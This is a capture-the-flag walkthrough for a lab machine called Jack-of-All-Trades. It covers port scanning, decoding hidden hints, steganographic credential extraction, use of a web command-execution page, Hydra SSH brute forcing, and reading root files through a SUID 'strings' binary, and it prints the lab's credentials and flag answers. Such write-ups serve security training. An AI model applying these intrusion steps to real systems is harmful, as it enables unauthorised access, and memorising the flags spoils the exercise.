# Jack-of-All-Trades

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems. We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.10 (Debian)
80/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

---

## Proxy Bypass

Trying the web server, we get this message:

```
The connection was reset

The connection to the server was reset while the page was loading.

The site could be temporarily unavailable or too busy. Try again in a few moments.
If you are unable to load any pages, check your computer\u2019s network connection.
If your computer or network is protected by a firewall or proxy, make sure that Firefox is permitted to access the web.
```

In Firefox, navigate to `about:preferences#general`. Then go to:

<img width="810" height="176" alt="Screenshot From 2025-09-03 16-17-16" src="https://github.com/user-attachments/assets/71eac38b-f063-418e-af75-951e3fa25e94" />

Click settings at the bottom. Click **Manual proxy configuration** and put your IP address and port 22. Then you’re in.

<img width="1853" height="919" alt="Screenshot From 2025-09-03 16-19-47" src="https://github.com/user-attachments/assets/c87fcb87-e147-40b7-a412-cea03e8f7842" />
---

## Source Code

Looking at the source code, we see:

```
!!Note to self: If I ever get locked out I can get back in at /recovery.php!
!! UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

Taking it to CyberChef, we decode and get:

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

<img width="1853" height="919" alt="Screenshot From 2025-09-03 16-24-35" src="https://github.com/user-attachments/assets/3ba1af00-a9e7-42d1-b303-7e08d2a7f6ec" />

Trying the username and password doesn’t work. Checking the source page again, we see another encoded message:

```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRV...
```

After trial and error, I used this line:

```bash
printf 'GQ2TOMRXME3TEN3B...[truncated]' | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

This decoded to:

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

---

## Stego

Visiting the bit.ly link, it redirected to a Wikipedia page about **Stegosauria**. That’s the same dinosaur shown on the homepage, so it was a hint.

Downloading the dino image on the site and using steghide:

```bash
steghide extract -sf stego.jpg
```

Prompted for the passphrase, I used the earlier password `u?WtKSraq`.

```
wrote extracted data to "creds.txt"
cat creds.txt 
Hehe. Gotcha!
You're on the right path, but wrong image!
```

That meant we needed the correct image. Heading over to `/assets`, I found more images.

I downloaded `header.jpg` and extracted:

```
cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

---

## Recovery Login

Using the username and password at `/recovery.php` gave:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

So we could add `?cmd=` in the URL.

Example:

```
http://jack.thm/recovery.php?cmd=ls -al /home
```

We saw `jacks_password_list`.

Using `cat`, we got a password list with many entries.

---

## Hydra

I used Hydra with the password list:

```bash
hydra -l jack -P pass.txt -s 80 jack.thm ssh
```

Result:

```
[80][ssh] host: jack.thm   login: jack   password: ITMJpGGIqg1jn?
```

---

## SSH

Now that we had the username and password, we logged in:

```bash
ssh -p 80 jack@jack.thm
```

We saw `user.jpg`. After downloading and extracting the file, I got the first flag:

> Q1: User flag
> A1: securi-tay2020\_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

<img width="1853" height="919" alt="Screenshot From 2025-09-03 19-25-31" src="https://github.com/user-attachments/assets/b5ff2e28-ecab-4583-b105-67d123d376c7" />

---

## Privilege Escalation

Trying `sudo -l` didn’t work, so I checked for SUID binaries:

```bash
find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Found:

```
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
```

This meant we could run `strings` with root privileges.

```bash
strings /root/root.txt
```

Output:

```
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

---

## Flags

> Q1: User flag
> A1: securi-tay2020\_{p3ngu1n-hunt3r-3xtr40rd1n41r3}

> Q2: Root flag
> A2: securi-tay2020\_{6f125d32f38fb8ff9e720d2dbce2210a}
